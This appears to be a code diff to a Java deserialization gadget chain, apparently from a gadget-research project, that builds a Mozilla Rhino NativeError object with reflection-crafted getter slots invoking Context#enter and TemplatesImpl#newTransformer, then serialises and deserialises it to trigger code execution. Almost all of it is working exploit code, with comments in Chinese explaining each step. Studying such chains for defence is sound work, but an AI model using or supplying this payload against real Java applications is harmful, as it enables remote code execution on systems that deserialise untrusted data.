@@ -7,6 +7,7 @@ import com.trganda.gadget.utils.Reflections;
 import org.mozilla.javascript.*;
 
 import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
 import java.lang.reflect.Method;
 import java.nio.file.Files;
 import java.nio.file.Paths;
@@ -14,31 +15,49 @@ import java.util.Base64;
 
 import javax.management.BadAttributeValueExpException;
 
-public class RhinoExec {
-
+public class MozillaRhinoExec {
     public static Object getObject() throws Exception {
         Class<?> nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
         ScriptableObject nativeError =
                 (ScriptableObject) Reflections.createWithoutConstructor(nativeErrorClass);
 
-        // 通过 ScriptableObject.getSlot 方法构造并赋值
+        // 创建第一个 GetterSlot 调用 `Context#enter` 方法
         // 第一个参数为 "name" 因为 js_toString 中 ScriptableObject#getProperty 的第二个参数为 name；第三个参数设置为 4，创建的才会是
         // GetterSlot
-        Object slot =
+        Object nameSlot =
+            Reflections.getMethod(
+                    ScriptableObject.class,
+                    "getSlot",
+                    String.class,
+                    int.class,
+                    int.class)
+                .invoke(nativeError, "name", 0, 4);
+        // 设定动态调用的方法为 Context#enter
+        Method enterMethod = Reflections.getMethod(Context.class, "enter");
+        // 创建 MemberBox
+        Class<?> memberBoxErrorClass = Class.forName("org.mozilla.javascript.MemberBox");
+        Object memberBox = Reflections.createWithoutConstructor(memberBoxErrorClass);
+        Reflections.getMethod(memberBoxErrorClass, "init", Method.class).invoke(memberBox, enterMethod);
+        Reflections.setFieldValue(nameSlot, "getter", memberBox);
+
+        // 创建第二个 GetterSlot 调用 `TemplatesImpl#newTransformer` 方法
+        // 第一个参数为 "message" 因为 js_toString 中 ScriptableObject#getProperty 的第二个参数为 message；第三个参数设置为 4，创建的才会是
+        // GetterSlot
+        Object messageSlot =
                 Reflections.getMethod(
                                 ScriptableObject.class,
                                 "getSlot",
                                 String.class,
                                 int.class,
                                 int.class)
-                        .invoke(nativeError, "name", 0, 4);
+                        .invoke(nativeError, "message", 0, 4);
 
         // 设定动态调用的方法为 TemplatesImpl#newTransformer
         Method templateMethod = Reflections.getMethod(TemplatesImpl.class, "newTransformer");
 
         // 创建 NativeJavaMethod
-        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(templateMethod, "exec");
-        Reflections.setFieldValue(slot, "getter", nativeJavaMethod);
+        NativeJavaMethod transformerJavaMethod = new NativeJavaMethod(templateMethod, "templates");
+        Reflections.setFieldValue(messageSlot, "getter", transformerJavaMethod);
 
         // TemplatesImpl 利用链
         TemplatesImpl templatesImpl = new TemplatesImpl();
@@ -66,13 +85,12 @@ public class RhinoExec {
     }
 
     public static void main(String[] args) throws Exception {
-        // ObjectOutputStream oos =
-        //    new ObjectOutputStream(
-        //        Files.newOutputStream(Paths.get("target/RhinoExec.bin")));
-        // oos.writeObject(getObject());
-        Context context = Context.enter();
+        ObjectOutputStream oos =
+                new ObjectOutputStream(Files.newOutputStream(Paths.get("target/MozillaRhinoExec.bin")));
+        oos.writeObject(getObject());
+
         ObjectInputStream ois =
-                new ObjectInputStream(Files.newInputStream(Paths.get("target/RhinoExec.bin")));
+                new ObjectInputStream(Files.newInputStream(Paths.get("target/MozillaRhinoExec.bin")));
         ois.readObject();
     }
 }
